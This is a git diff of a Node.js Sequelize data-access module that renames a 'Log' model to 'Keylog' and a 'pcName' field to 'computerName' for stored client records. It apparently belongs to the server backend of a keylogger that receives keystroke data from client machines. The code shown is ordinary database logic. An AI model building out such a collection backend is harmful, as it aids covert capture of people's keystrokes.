@@ -1,7 +1,7 @@
 'use strict'
 
 const Client = require('../models/Client')
-const Log = require('../models/Log')
+const Keylog = require('../models/Keylog')
 const { QueryTypes, col, json } = require('sequelize')
 
 const clientDao = {
@@ -20,6 +20,8 @@ const clientDao = {
         return client
     },
 
+
+
     findOneByUuid: async function (uuid) {
 
         const client = await Client.findOne({
@@ -29,25 +31,29 @@ const clientDao = {
         })
         return client
     },
-    insertOne: async function ({ uuid, pcName }) {
+    insertOne: async function ({ uuid, computerName }) {
 
         const client = await Client.create({
             uuid: uuid,
-            pcName: pcName
+            computerName: computerName
         })
-        return client.dataValues
+        return client
     },
-    updateOne: async function ({ uuid, pcName }) {
+    updateOne: async function ({ uuid, computerName }) {
 
         const client = await Client.update(
-            { uuid: uuid, pcName: pcName },
+            { uuid: uuid, computerName: computerName },
             { where: { uuid: uuid }, returning: true, plain: true }
         )
-        return client[1].dataValues
+        return client
     },
+
+
+
+
     insertLogs: async function (clientId, jsonData) {
 
-        const logs = await Log.create({
+        const logs = await Keylog.create({
             jsonData: jsonData,
             fk_clientId: clientId
         })
